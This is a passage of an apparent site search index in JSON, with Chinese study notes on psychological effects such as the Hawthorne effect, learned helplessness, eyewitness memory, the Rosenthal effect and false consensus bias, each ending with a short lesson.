728\u8054\u7cfb\u7684\u4e00\u4e9b\u4e2a\u6027\u6216\u5916\u8c8c\u7279\u5f81\u8054\u7cfb\u5728\u4e00\u8d77\uff0c\u65ad\u8a00\u6709\u8fd9\u79cd\u7279\u5f81\u5fc5\u7136\u4f1a\u6709\u53e6\u4e00\u79cd\u7279\u5f81\uff1b\u7b2c\u4e09\uff0c\u5b83\u8bf4\u597d\u5c31\u5168\u90fd\u80af\u5b9a\uff0c\u8bf4\u574f\u5c31\u5168\u90e8\u5426\u5b9a\uff0c\u8fd9\u662f\u4e00\u79cd\u53d7\u4e3b\u89c2\u504f\u89c1\u652f\u914d\u7684\u7edd\u5bf9\u5316\u503e\u5411\u3002\u603b\u4e4b\uff0c\u6655\u8f6e\u6548\u5e94\u662f\u4eba\u9645\u4ea4\u5f80\u4e2d\u5bf9\u4eba\u7684\u5fc3\u7406\u5f71\u54cd\u5f88\u5927\u7684\u8ba4\u77e5\u969c\u788d\uff0c\u6211\u4eec\u5728\u4ea4\u5f80\u4e2d\u8981\u5c3d\u91cf\u5730\u907f\u514d\u548c\u514b\u670d\u6655\u8f6e\u6548\u5e94\u7684\u526f\u4f5c\u7528\u3002</p>"},{"location":"note/01-effect/#hawthorne-effect","title":"\u970d\u6851\u6548\u5e94\uff08Hawthorne effect\uff09","text":"<p>\u5fc3\u7406\u5b66\u4e0a\u7684\u4e00\u79cd\u5b9e\u9a8c\u8005\u6548\u5e94\u300220\u4e16\u7eaa20-30\u5e74\u4ee3\uff0c\u7f8e\u56fd\u7814\u7a76\u4eba\u5458\u5728\u829d\u52a0\u54e5\u897f\u65b9\u7535\u529b\u516c\u53f8\u970d\u6851\u5de5\u5382\u8fdb\u884c\u7684\u5de5\u4f5c\u6761\u4ef6\u3001\u793e\u4f1a\u56e0\u7d20\u548c\u751f\u4ea7\u6548\u76ca\u5173\u7cfb\u5b9e\u9a8c\u4e2d\u53d1\u73b0\u4e86\u5b9e\u9a8c\u8005\u6548\u5e94\uff0c\u79f0\u970d\u6851\u6548\u5e94\u3002</p> <p>\u5b9e\u9a8c\u7684\u7b2c\u4e00\u9636\u6bb5\u662f\u4ece1924\u5e7411\u6708\u5f00\u59cb\u7684\u5de5\u4f5c\u6761\u4ef6\u548c\u751f\u4ea7\u6548\u76ca\u7684\u5173\u7cfb\uff0c\u8bbe\u4e3a\u5b9e\u9a8c\u7ec4\u548c\u63a7\u5236\u7ec4\u3002\u7ed3\u679c\u4e0d\u7ba1\u589e\u52a0\u6216\u63a7\u5236\u7167\u660e\u5ea6\uff0c\u5b9e\u9a8c\u7ec4\u4ea7\u91cf\u90fd\u4e0a\u5347\uff0c\u800c\u4e14\u7167\u660e\u5ea6\u4e0d\u53d8\u7684\u63a7\u5236\u7ec4\u4ea7\u91cf\u4e5f\u589e\u52a0\u3002\u53e6\u5916\uff0c\u6709\u8bd5\u9a8c\u4e86\u5de5\u8d44\u62a5\u916c\u3001\u5de5\u95f4\u4f11\u606f\u65f6\u95f4\u3001\u6bcf\u65e5\u5de5\u4f5c\u957f\u5ea6\u548c\u6bcf\u5468\u5de5\u4f5c\u5929\u6570\u7b49\u56e0\u7d20\uff0c\u4e5f\u770b\u4e0d\u51fa\u8fd9\u4e9b\u5de5\u4f5c\u6761\u4ef6\u5bf9\u751f\u4ea7\u6548\u76ca\u6709\u4f55\u76f4\u63a5\u5f71\u54cd\u3002\u7b2c\u4e8c\u9636\u6bb5\u7684\u8bd5\u9a8c\u662f\u7531\u7f8e\u56fd\u54c8\u4f5b\u5927\u5b66\u6559\u6388\u6885\u5965\u9886\u5bfc\u7684\uff0c\u7740\u91cd\u7814\u7a76\u793e\u4f1a\u56e0\u7d20\u4e0e\u751f\u4ea7\u6548\u7387\u7684\u5173\u7cfb\uff0c\u7ed3\u679c\u53d1\u73b0\u751f\u4ea7\u6548\u7387\u7684\u63d0\u9ad8\u4e3b\u8981\u662f\u7531\u4e8e\u88ab\u5b9e\u9a8c\u8005\u5728\u7cbe\u795e\u65b9\u9762\u53d1\u751f\u4e86\u5de8\u5927\u7684\u53d8\u5316\u3002\u53c2\u52a0\u8bd5\u9a8c\u7684\u5de5\u4eba\u88ab\u7f6e\u4e8e\u4e13\u95e8\u7684\u5b9e\u9a8c\u5ba4\u5e76\u7531\u7814\u7a76\u4eba\u5458\u9886\u5bfc\uff0c\u5176\u793e\u4f1a\u72b6\u51b5\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u53d7\u5230\u5404\u65b9\u9762\u7684\u5173\u6ce8\uff0c\u4ece\u800c\u5f62\u6210\u4e86\u53c2\u4e0e\u8bd5\u9a8c\u7684\u611f\u89c9\uff0c\u89c9\u5f97\u81ea\u5df1\u662f\u516c\u53f8\u4e2d\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u4ece\u800c\u4f7f\u5de5\u4eba\u4ece\u793e\u4f1a\u89d2\u5ea6\u65b9\u9762\u88ab\u6fc0\u52b1\uff0c\u4fc3\u8fdb\u4ea7\u91cf\u4e0a\u5347\u3002</p> <p>\u8fd9\u4e2a\u6548\u5e94\u544a\u8bc9\u6211\u4eec\uff0c\u5f53\u540c\u5b66\u6216\u81ea\u5df1\u53d7\u5230\u516c\u4f17\u7684\u5173\u6ce8\u6216\u6ce8\u89c6\u65f6\uff0c\u5b66\u4e60\u548c\u4ea4\u5f80\u7684\u6548\u7387\u5c31\u4f1a\u5927\u5927\u589e\u52a0\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5728\u65e5\u5e38\u751f\u6d3b\u4e2d\u8981\u5b66\u4f1a\u4e0e\u4ed6\u4eba\u53cb\u597d\u76f8\u5904\uff0c\u660e\u767d\u4ec0\u4e48\u6837\u7684\u884c\u4e3a\u624d\u662f\u540c\u5b66\u548c\u8001\u5e08\u6240\u63a5\u53d7\u548c\u8d5e\u8d4f\u7684\uff0c\u6211\u4eec\u53ea\u6709\u5728\u751f\u6d3b\u548c\u5b66\u4e60\u4e2d\u4e0d\u65ad\u5730\u589e\u52a0\u81ea\u5df1\u7684\u826f\u597d\u884c\u4e3a\uff0c\u624d\u53ef\u80fd\u53d7\u5230\u66f4\u591a\u4eba\u7684\u5173\u6ce8\u548c\u8d5e\u8d4f\uff0c\u4e5f\u624d\u53ef\u80fd\u8ba9\u6211\u4eec\u7684\u5b66\u4e60\u4e0d\u65ad\u8fdb\u6b65\uff0c\u5145\u6ee1\u81ea\u4fe1\uff01</p>"},{"location":"note/01-effect/#_7","title":"\u4e60\u5f97\u6027\u65e0\u52a9\u5b9e\u9a8c","text":"<p>\u4e60\u5f97\u6027\u65e0\u52a9\u6548\u5e94\u6700\u65e9\u6709\u5965\u5f17\u7c73\u5c14\u548c\u897f\u91cc\u683c\u66fc\u53d1\u73b0\uff0c\u540e\u6765\u5728\u52a8\u7269\u548c\u4eba\u7c7b\u7814\u7a76\u4e2d\u88ab\u5e7f\u6cdb\u63a2\u8ba8\u3002\u7b80\u5355\u5730\u8bf4\uff0c\u5f88\u591a\u5b9e\u9a8c\u8868\u660e\uff0c\u7ecf\u8fc7\u8bad\u7ec3\uff0c\u72d7\u53ef\u4ee5\u8d8a\u8fc7\u5c4f\u969c\u6216\u4ece\u4e8b\u5176\u4ed6\u7684\u884c\u4e3a\u6765\u9003\u907f\u5b9e\u9a8c\u8005\u52a0\u4e8e\u5b83\u7684\u7535\u51fb\u3002\u4f46\u662f\uff0c\u5982\u679c\u72d7\u4ee5\u524d\u53d7\u5230\u4e0d\u53ef\u9884\u671f\uff08\u4e0d\u77e5\u9053\u4ec0\u4e48\u65f6\u5019\u5230\u6765\uff09\u4e14\u4e0d\u53ef\u63a7\u5236\u7684\u7535\u51fb\uff08\u5982\u7535\u51fb\u7684\u4e2d\u65ad\u4e0e\u5426\u4e0d\u4f9d\u8d56\u4e8e\u72d7\u7684\u884c\u4e3a\uff09\uff0c\u5f53\u72d7\u540e\u6765\u6709\u673a\u4f1a\u9003\u79bb\u7535\u51fb\u65f6\uff0c\u4ed6\u4eec\u4e5f\u53d8\u5f97\u65e0\u529b\u9003\u79bb\u3002\u800c\u4e14\uff0c\u72d7\u8fd8\u8868\u73b0\u51fa\u5176\u4ed6\u65b9\u9762\u7684\u7f3a\u9677\uff0c\u5982\u611f\u5230\u6cae\u4e27\u548c\u538b\u6291\uff0c\u4e3b\u52a8\u6027\u964d\u4f4e\u7b49\u7b49\u3002</p> <p>\u72d7\u4e4b\u6240\u4ee5\u8868\u73b0\u51fa\u8fd9\u79cd\u72b6\u51b5\uff0c\u662f\u7531\u4e8e\u5728\u5b9e\u9a8c\u7684\u65e9\u671f\u5b66\u5230\u4e86\u4e00\u79cd\u65e0\u52a9\u611f\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u4eec\u8ba4\u8bc6\u5230\u81ea\u5df1\u65e0\u8bba\u505a\u4ec0\u4e48\u90fd\u4e0d\u80fd\u63a7\u5236\u7535\u51fb\u7684\u7ec8\u6b62\u3002\u5728\u6bcf\u6b21\u5b9e\u9a8c\u4e2d\uff0c\u7535\u51fb\u7ec8\u6b62\u90fd\u662f\u5728\u5b9e\u9a8c\u8005\u638c\u63a7\u4e4b\u4e0b\u7684\uff0c\u800c\u72d7\u4f1a\u8ba4\u8bc6\u5230\u81ea\u5df1\u6ca1\u6709\u80fd\u529b\u6539\u53d8\u8fd9\u79cd\u5916\u754c\u7684\u63a7\u5236\uff0c\u4ece\u800c\u5b66\u5230\u4e86\u4e00\u79cd\u65e0\u52a9\u611f\u3002</p> <p>\u4eba\u5982\u679c\u4ea7\u751f\u4e86\u4e60\u5f97\u6027\u65e0\u52a9\uff0c\u5c31\u6210\u4e3a\u4e86\u4e00\u79cd\u6df1\u6df1\u7684\u7edd\u671b\u548c\u60b2\u54c0\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5728\u5b66\u4e60\u548c\u751f\u6d3b\u4e2d\u5e94\u628a\u81ea\u5df1\u7684\u773c\u5149\u5728\u5f00\u9614\u4e00\u70b9\uff0c\u770b\u5230\u4e8b\u4ef6\u80cc\u540e\u7684\u771f\u6b63\u7684\u51b3\u5b9a\u56e0\u7d20\uff0c\u4e0d\u8981\u4f7f\u6211\u4eec\u81ea\u5df1\u9677\u5165\u7edd\u671b\u3002</p>"},{"location":"note/01-effect/#_8","title":"\u8bc1\u4eba\u7684\u8bb0\u5fc6","text":"<p>\u8bc1\u4eba\uff0c\u5728\u6211\u4eec\u7684\u8ba4\u8bc6\u91cc\uff0c\u901a\u5e38\u90fd\u662f\u63d0\u4f9b\u4e00\u4e9b\u5ba2\u89c2\u7684\u8bc1\u636e\u7684\u4eba\uff0c\u5c31\u662f\u628a\u81ea\u5df1\u4eb2\u773c\u770b\u5230\u3001\u4eb2\u8033\u542c\u5230\u7684\u4e1c\u897f\u5982\u5b9e\u5730\u8bb2\u51fa\u6765\u7684\u4eba\u3002\u7136\u800c\uff0c\u5fc3\u7406\u5b66\u7814\u7a76\u8bc1\u660e\uff0c\u5f88\u591a\u8bc1\u4eba\u63d0\u4f9b\u7684\u8bc1\u8bcd\u90fd\u4e0d\u592a\u51c6\u786e\uff0c\u6216\u8005\u8bf4\u662f\u5177\u6709\u4e2a\u4eba\u503e\u5411\u6027\uff0c\u5e26\u7740\u4e2a\u4eba\u7684\u89c2\u70b9\u548c\u610f\u8bc6\u3002</p> <p>\u8bc1\u4eba\u5bf9\u4ed6\u4eec\u7684\u8bc1\u8bcd\u7684\u4fe1\u5fc3\u5e76\u4e0d\u80fd\u51b3\u5b9a\u4ed6\u4eec\u8bc1\u8bcd\u7684\u51c6\u786e\u6027\uff0c\u8fd9\u4e00\u7814\u7a76\u7ed3\u679c\u4ee4\u4eba\u611f\u5230\u60ca\u8bb6\u3002\u5fc3\u7406\u5b66\u5bb6\u73c0\u8d39\u53ef\u7279\u548c\u8c6a\u6797\u65af\u51b3\u5b9a\u5bf9\u8fd9\u4e00\u7ed3\u8bba\u8fdb\u884c\u66f4\u6df1\u5165\u7684\u7814\u7a76\u3002\u4e3a\u4e86\u8003\u5bdf\u8bc1\u4eba\u7684\u8bc1\u8bcd\u662f\u5426\u6709\u7279\u522b\u7684\u4e1c\u897f\uff0c\u4ed6\u4eec\u5c06\u8bc1\u4eba\u7684\u8bb0\u5fc6\u4e0e\u5bf9\u4e00\u822c\u77e5\u8bc6\u7684\u8bb0\u5fc6\u8fdb\u884c\u4e86\u6bd4\u8f83\u3002</p> <p>\u4ed6\u4eec\u8ba9\u88ab\u8bd5\u770b\u4e00\u4e2a\u7b80\u77ed\u7684\u5f55\u8c61\uff0c\u662f\u5173\u4e8e\u4e00\u4e2a\u5973\u5b69\u88ab\u7ed1\u67b6\u7684\u6848\u4ef6\u3002\u7b2c\u4e8c\u5929\uff0c\u8ba9\u88ab\u8bd5\u56de\u7b54\u4e00\u4e9b\u6709\u5173\u5f55\u8c61\u91cc\u5185\u5bb9\u7684\u95ee\u9898\uff0c\u5e76\u8981\u6c42\u4ed6\u4eec\u8bf4\u51fa\u5bf9\u81ea\u5df1\u56de\u7b54\u7684\u4fe1\u5fc3\u7a0b\u5ea6\uff0c\u7136\u540e\u505a\u518d\u8ba4\u8bb0\u5fc6\u6d4b\u9a8c\u3002\u63a5\u4e0b\u6765\uff0c\u4f7f\u7528\u540c\u6837\u7684\u65b9\u6cd5\uff0c\u5185\u5bb9\u662f\u4ece\u767e\u79d1\u5168\u4e66\u548c\u901a\u4fd7\u8bfb\u7269\u4e2d\u9009\u51fa\u7684\u4e00\u822c\u77e5\u8bc6\u95ee\u9898\u3002</p> <p>\u548c\u4ee5\u524d\u53d1\u751f\u7684\u4e00\u6837\uff0c\u73c0\u8d39\u53ef\u7279\u548c\u8c6a\u6797\u65af\u4e5f\u53d1\u73b0\uff0c\u5728\u8bc1\u4eba\u56de\u5fc6\u7684\u7cbe\u786e\u6027\u4e0a\uff0c\u90a3\u4e9b\u5bf9\u81ea\u5df1\u7684\u56de\u7b54\u4fe1\u5fc3\u5341\u8db3\u7684\u4eba\u5b9e\u9645\u4e0a\u5e76\u4e0d\u6bd4\u90a3\u4e9b\u6ca1\u4fe1\u5fc3\u7684\u4eba\u66f4\u9ad8\u660e\uff0c\u4f46\u5bf9\u4e8e\u4e00\u822c\u77e5\u8bc6\u6765\u8bf4\uff0c\u60c5\u51b5\u5c31\u4e0d\u662f\u8fd9\u6837\uff0c\u4fe1\u5fc3\u9ad8\u7684\u4eba\u56de\u5fc6\u6210\u7ee9\u6bd4\u4fe1\u5fc3\u4e0d\u8db3\u7684\u4eba\u597d\u5f97\u591a\u3002</p> <p>\u4eba\u4eec\u5bf9\u4e8e\u81ea\u5df1\u5728\u4e00\u822c\u77e5\u8bc6\u4e0a\u7684\u4f18\u52bf\u4e0e\u5f31\u52bf\u6709\u81ea\u77e5\u4e4b\u660e\u3002\u56e0\u6b64\uff0c\u503e\u5411\u4e8e\u4fee\u6539\u4ed6\u4eec\u5bf9\u4e8e\u4fe1\u5fc3\u91cf\u8868\u7684\u6d4b\u9a8c\u7ed3\u679c\u3002\u4e00\u822c\u77e5\u8bc6\u662f\u4e00\u4e2a\u6570\u636e\u5e93\uff0c\u5728\u4e2a\u4f53\u4e4b\u95f4\u662f\u5171\u4eab\u7684\uff0c\u5b83\u6709\u516c\u8ba4\u7684\u6b63\u786e\u7b54\u6848\uff0c\u88ab\u8bd5\u53ef\u4ee5\u81ea\u5df1\u53bb\u8861\u91cf\u3002\u4f8b\u5982\uff0c\u4eba\u4eec\u4f1a\u77e5\u9053\u81ea\u5df1\u5728\u4f53\u80b2\u95ee\u9898\u4e0a\u662f\u5426\u6bd4\u522b\u4eba\u66f4\u597d\u6216\u66f4\u5dee\u4e00\u70b9\u3002\u4f46\u662f\uff0c\u76ee\u51fb\u7684\u4e8b\u4ef6\u4e0d\u53d7\u8fd9\u79cd\u81ea\u77e5\u4e4b\u660e\u7684\u5f71\u54cd\u3002\u4f8b\u5982\uff0c\u4ece\u603b\u4f53\u4e0a\u8bb2\uff0c\u4ed6\u4eec\u4e0d\u5927\u53ef\u80fd\u77e5\u9053\u81ea\u5df1\u6bd4\u522b\u4eba\u5728\u8bb0\u5fc6\u4e8b\u4ef6\u4e2d\u7684\u53c2\u4e0e\u8005\u5934\u53d1\u989c\u8272\u65b9\u9762\u66f4\u597d\u6216\u66f4\u5dee\u3002</p>"},{"location":"note/01-effect/#_9","title":"\u7f57\u68ee\u5854\u5c14\u6548\u5e94","text":"<p>\u7f8e\u56fd\u5fc3\u7406\u5b66\u5bb6\u7f57\u68ee\u5854\u5c14\u7b49\u4eba\u4e8e1968\u5e74\u505a\u8fc7\u4e00\u4e2a\u8457\u540d\u5b9e\u9a8c\u3002\u4ed6\u4eec\u5230\u4e00\u6240\u5c0f\u5b66\uff0c\u5728\u4e00\u81f3\u516d\u5e74\u7ea7\u5404\u9009\u4e09\u4e2a\u73ed\u7684\u513f\u7ae5\u8fdb\u884c\u715e\u6709\u4ecb\u4e8b\u7684\u201c\u9884\u6d4b\u672a\u6765\u53d1\u5c55\u7684\u6d4b\u9a8c\u201d\uff0c\u7136\u540e\u5b9e\u9a8c\u8005\u5c06\u8ba4\u4e3a\u6709\u201c\u4f18\u5f02\u53d1\u5c55\u53ef\u80fd\u201d\u7684\u5b66\u751f\u540d\u5355\u901a\u77e5\u6559\u5e08\u3002\u5176\u5b9e\uff0c\u8fd9\u4e2a\u540d\u5355\u5e76\u4e0d\u662f\u6839\u636e\u6d4b\u9a8c\u7ed3\u679c\u786e\u5b9a\u7684\uff0c\u800c\u662f\u968f\u673a\u62bd\u53d6\u7684\u3002\u5b83\u662f\u4ee5\u201c\u6743\u5a01\u6027\u7684\u8c0e\u8a00\u201d\u6697\u793a\u6559\u5e08\uff0c\u4ece\u800c\u8c03\u52a8\u4e86\u6559\u5e08\u5bf9\u540d\u5355\u4e0a\u7684\u5b66\u751f\u7684\u67d0\u79cd\u671f\u5f85\u5fc3\u7406\u30028\u4e2a\u6708\u540e\uff0c\u518d\u6b21\u667a\u80fd\u6d4b\u9a8c\u7684\u7ed3\u679c\u53d1\u73b0\uff0c\u540d\u5355\u4e0a\u7684\u5b66\u751f\u7684\u6210\u7ee9\u666e\u904d\u63d0\u9ad8\uff0c\u6559\u5e08\u4e5f\u7ed9\u4e86\u4ed6\u4eec\u826f\u597d\u7684\u54c1\u884c\u8bc4\u8bed\u3002\u8fd9\u4e2a\u5b9e\u9a8c\u53d6\u5f97\u4e86\u5947\u8ff9\u822c\u7684\u6548\u679c\uff0c\u4eba\u4eec\u628a\u8fd9\u79cd\u901a\u8fc7\u6559\u5e08\u5bf9\u5b66\u751f\u5fc3\u7406\u7684\u6f5c\u79fb\u9ed8\u5316\u7684\u5f71\u54cd\uff0c\u4ece\u800c\u4f7f\u5b66\u751f\u53d6\u5f97\u6559\u5e08\u6240\u671f\u671b\u7684\u8fdb\u6b65\u7684\u73b0\u8c61\uff0c\u79f0\u4e3a\u201c\u7f57\u68ee\u5854\u5c14\u6548\u5e94\u201d\uff0c\u4e60\u60ef\u4e0a\u4e5f\u79f0\u4e3a\u76ae\u683c\u9a6c\u5229\u7fc1\u6548\u5e94\uff08\u76ae\u683c\u9a6c\u5229\u7fc1\u662f\u53e4\u5e0c\u814a\u795e\u8bdd\u4e2d\u585e\u6d66\u8def\u65af\u56fd\u738b\uff0c\u4ed6\u5bf9\u4e00\u5c0a\u5c11\u5973\u5851\u50cf\u4ea7\u751f\u7231\u6155\u4e4b\u60c5\uff0c\u4ed6\u7684\u70ed\u671b\u6700\u7ec8\u4f7f\u8fd9\u5c0a\u96d5\u50cf\u53d8\u4e3a\u4e00\u4e2a\u771f\u4eba\uff0c\u4e24\u4eba\u76f8\u7231\u7ed3\u5408\uff09\u3002</p> <p>\u6559\u80b2\u5b9e\u8df5\u4e5f\u8868\u660e\uff1a\u5982\u679c\u6559\u5e08\u559c\u7231\u67d0\u4e9b\u5b66\u751f\uff0c\u5bf9\u4ed6\u4eec\u4f1a\u62b1\u6709\u8f83\u9ad8\u671f\u671b\uff0c\u7ecf\u8fc7\u4e00\u6bb5\u65f6\u95f4\uff0c\u5b66\u751f\u611f\u53d7\u5230\u6559\u5e08\u7684\u5173\u6000\u3001\u7231\u62a4\u548c\u9f13\u52b1\uff1b\u5e38\u5e38\u4ee5\u79ef\u6781\u6001\u5ea6\u5bf9\u5f85\u8001\u5e08\u3001\u5bf9\u5f85\u5b66\u4e60\u4ee5\u53ca\u5bf9\u5f85\u81ea\u5df1\u7684\u884c\u4e3a\uff0c\u5b66\u751f\u66f4\u52a0\u81ea\u5c0a\u3001\u81ea\u4fe1\u3001\u81ea\u7231\u3001\u81ea\u5f3a\uff0c\u8bf1\u53d1\u51fa\u4e00\u79cd\u79ef\u6781\u5411\u4e0a\u7684\u6fc0\u60c5\uff0c\u8fd9\u4e9b\u5b66\u751f\u5e38\u5e38\u4f1a\u53d6\u5f97\u8001\u5e08\u6240\u671f\u671b\u7684\u8fdb\u6b65\u3002\u76f8\u53cd\uff0c\u90a3\u4e9b\u53d7\u5230\u8001\u5e08\u5ffd\u89c6\u3001\u6b67\u89c6\u7684\u5b66\u751f\uff0c\u4e45\u800c\u4e45\u4e4b\u4f1a\u4ece\u6559\u5e08\u7684\u8a00\u8c08\u3001\u4e3e\u6b62\u3001\u8868\u60c5\u4e2d\u611f\u53d7\u5230\u6559\u5e08\u7684\u201c\u504f\u5fc3\u201d\uff0c\u4e5f\u4f1a\u4ee5\u6d88\u6781\u7684\u6001\u5ea6\u5bf9\u5f85\u8001\u5e08\u3001\u5bf9\u5f85\u81ea\u5df1\u7684\u5b66\u4e60\uff0c\u4e0d\u7406\u4f1a\u6216\u62d2\u7edd\u542c\u4ece\u8001\u5e08\u7684\u8981\u6c42\uff1b\u8fd9\u4e9b\u5b66\u751f\u5e38\u5e38\u4f1a\u4e00\u5929\u5929\u53d8\u574f\uff0c\u6700\u540e\u6ca6\u4e3a\u793e\u4f1a\u7684\u4e0d\u826f\u5206\u5b50\u3002\u5c3d\u7ba1\u6709\u4e9b\u4f8b\u5916\uff0c\u4f46\u5927\u8d8b\u52bf\u5374\u662f\u5982\u6b64\uff0c\u540c\u65f6\u8fd9\u4e5f\u7ed9\u6559\u5e08\u6572\u54cd\u4e86\u8b66\u949f\u3002</p>"},{"location":"note/01-effect/#false-consensus-bias","title":"\u865a\u5047\u540c\u611f\u504f\u5dee\uff08false consensus bias\uff09","text":"<p>\u6211\u4eec\u901a\u5e38\u90fd\u4f1a\u76f8\u4fe1\uff0c\u6211\u4eec\u7684\u7231\u597d\u4e0e\u5927\u591a\u6570\u4eba\u662f\u4e00\u6837\u7684\u3002\u5982\u679c\u4f60\u559c\u6b22\u73a9\u7535\u8111\u6e38\u620f\uff0c\u90a3\u4e48\u5c31\u6709\u53ef\u80fd\u9ad8\u4f30\u559c\u6b22\u7535\u8111\u6e38\u620f\u7684\u4eba\u6570\u3002\u4f60\u4e5f\u901a\u5e38\u4f1a\u9ad8\u4f30\u7ed9\u81ea\u5df1\u559c\u6b22\u7684\u540c\u5b66\u6295\u7968\u7684\u4eba\u6570\uff0c\u9ad8\u4f30\u81ea\u5df1\u5728\u7fa4\u4f53\u4e2d\u7684\u5a01\u4fe1\u4e0e\u9886\u5bfc\u80fd\u529b\u7b49\u7b49\u3002\u4f60\u7684\u8fd9\u79cd\u9ad8\u4f30\u4e0e\u4f60\u7684\u884c\u4e3a\u53ca\u6001\u5ea6\u6709\u76f8\u540c\u7279\u70b9\u7684\u4eba\u6570\u7684\u503e\u5411\u6027\u5c31\u53eb\u505a\u201c\u865a\u5047\u540c\u611f\u504f\u5dee\u201d\u3002\u6709\u4e9b\u56e0\u7d20\u4f1a\u5f71\u54cd\u4f60\u7684\u8fd9\u79cd\u865a\u5047\u540c\u611f\u504f\u5dee\u5f3a\u5ea6\uff1a</p> <p>\uff081\uff09\u5f53\u5916\u90e8\u7684\u5f52\u56e0\u5f3a\u4e8e\u5185\u90e8\u5f52\u56e0\u65f6\uff1b</p> <p>\uff082\uff09\u5f53\u524d\u7684\u884c\u4e3a\u6216\u4e8b\u4ef6\u5bf9\u67d0\u4eba\u975e\u5e38\u91cd\u8981\u65f6\uff1b</p> <p>\uff083\uff09\u5f53\u4f60\u5bf9\u81ea\u5df1\u7684\u89c2\u70b9\u975e\u5e38\u786e\u5b9a\u6216\u575a\u4fe1\u65f6\uff1b</p> <p>\uff084\uff09\u5f53\u4f60\u7684\u5730\u4f4d\u6216\u6b63\u5e38\u751f\u6d3b\u548c\u5b66\u4e60\u53d7\u5230\u67d0\u79cd\u5a01\u80c1\u65f6\uff1b</p> <p>\uff085\uff09\u5f53\u6d89\u53ca\u5230\u67d0\u79cd\u79ef\u6781\u7684\u54c1\u8d28\u6216\u4e2a\u6027\u65f6\uff1b</p> <p>\uff086\uff09\u5f53\u4f60\u5c06\u5176\u4ed6\u4eba\u770b\u6210\u4e0e\u81ea\u5df1\u662f\u76f8\u4f3c\u65f6\u3002</p>"},{"location":"note/01-effect/#_10","title":"\u8774\u8776\u6548\u5e94","text":"<p>\u4e0a\u4e2a\u4e16\u7eaa70\u5e74\u4ee3\uff0c\u7f8e\u56fd\u4e00\u4e2a\u540d\u53eb\u6d1b\u4f26\u5179\u7684\u6c14\u8c61\u5b66\u5bb6\u5728\u89e3\u91ca\u7a7a\u6c14\u7cfb\u7edf\u7406\u8bba\u65f6\u8bf4\uff0c\u4e9a\u9a6c\u900a\u96e8\u6797\u4e00\u53ea\u8774\u8776\u7fc5\u8180\u5076\u5c14\u632f\u52a8\uff0c\u4e5f\u8bb8\u4e24\u5468\u540e\u5c31\u4f1a\u5f15\u8d77\u7f8e\u56fd\u5f97\u514b\u8428\u65af\u5dde\u7684\u4e00\u573a\u9f99\u5377\u98ce\u3002</p> <p>\u8774\u8776\u6548\u5e94\u662f\u8bf4\uff0c\u521d\u59cb\u6761\u4ef6\u5341\u5206\u5fae\u5c0f\u7684\u53d8\u5316\u7ecf\u8fc7\u4e0d\u65ad\u653e\u5927\uff0c\u5bf9\u5176\u672a\u6765\u72b6\u6001\u4f1a\u9020\u6210\u6781\u5176\u5de8\u5927\u7684\u5dee\u522b\u3002\u6709\u4e9b\u5c0f\u4e8b\u53ef\u4ee5\u7cca\u6d82\uff0c\u6709\u4e9b\u5c0f\u4e8b\u5982\u7ecf\u7cfb\u7edf\u653e\u5927\uff0c\u5219\u5bf9\u4e00\u4e2a\u7ec4\u7ec7\u3001\u4e00\u4e2a\u56fd\u5bb6\u6765\u8bf4\u662f\u5f88\u91cd\u8981\u7684\uff0c\u5c31\u4e0d\u80fd\u7cca\u6d82\u3002</p>"},{"location":"note/01-effect/#_11","title":"\u9752\u86d9\u73b0\u8c61","text":"<p>\u628a\u4e00\u53ea\u9752\u86d9\u76f4\u63a5\u653e\u8fdb\u70ed\u6c34\u9505\u91cc\uff0c\u7531\u4e8e\u5b83\u5bf9\u4e0d\u826f\u73af\u5883\u7684\u53cd\u5e94\u5341\u5206\u654f\u611f\uff0c\u5c31\u4f1a\u8fc5\u901f\u8df3\u51fa\u9505\u5916\u3002\u5982\u679c\u628a\u4e00\u4e2a\u9752\u86d9\u653e\u8fdb\u51b7\u6c34\u9505\u91cc\uff0c\u6162\u6162\u5730\u52a0\u6e29\uff0c\u9752\u86d9\u5e76\u4e0d\u4f1a\u7acb\u5373\u8df3\u51fa\u9505\u5916\uff0c\u6c34\u6e29\u9010\u6e10\u63d0\u9ad8\u7684\u6700\u7ec8\u7ed3\u5c40\u662f\u9752\u86d9\u88ab\u716e\u6b7b\u4e86\uff0c\u56e0\u4e3a\u7b49\u6c34\u6e29\u9ad8\u5230\u9752\u86d9\u65e0\u6cd5\u5fcd\u53d7\u65f6\uff0c\u5b83\u5df2\u7ecf\u6765\u4e0d\u53ca\u3001\u6216\u8005\u8bf4\u662f\u6ca1\u6709\u80fd\u529b\u8df3\u51fa\u9505\u5916\u4e86\u3002</p> <p>\u9752\u86d9\u73b0\u8c61\u544a\u8bc9\u6211\u4eec\uff0c\u4e00\u4e9b\u7a81\u53d8\u4e8b\u4ef6\uff0c\u5f80\u5f80\u5bb9\u6613\u5f15\u8d77\u4eba\u4eec\u7684\u8b66\u89c9\uff0c\u800c\u6613\u81f4\u4eba\u4e8e\u6b7b\u5730\u7684\u5374\u662f\u5728\u81ea\u6211\u611f\u89c9\u826f\u597d\u7684\u60c5\u51b5\u4e0b\uff0c\u5bf9\u5b9e\u9645\u60c5\u51b5\u7684\u9010\u6e10\u6076\u5316\uff0c\u6ca1\u6709\u6e05\u9192\u7684\u5bdf\u89c9\u3002</p>"},{"location":"note/01-effect/#_12","title":"\u9cc4\u9c7c\u6cd5\u5219","text":"<p>\u5176\u539f\u610f\u662f\u5047\u5b9a\u4e00\u53ea\u9cc4\u9c7c\u54ac\u4f4f\u4f60\u7684\u811a\uff0c\u5982\u679c\u4f60\u7528\u624b\u53bb\u8bd5\u56fe\u6323\u8131\u4f60\u7684\u811a\uff0c\u9cc4\u9c7c\u4fbf\u4f1a\u540c\u65f6\u54ac\u4f4f\u4f60\u7684\u811a\u4e0e\u624b\u3002\u4f60\u6108\u6323\u624e\uff0c\u5c31\u88ab\u54ac\u4f4f\u5f97\u8d8a\u591a\u3002\u6240\u4ee5\uff0c\u4e07\u4e00\u9cc4\u9c7c\u54ac\u4f4f\u4f60\u7684\u811a\uff0c\u4f60\u552f\u4e00\u7684\u529e\u6cd5\u5c31\u662f\u727a\u7272\u4e00\u53ea\u811a\u3002</p> 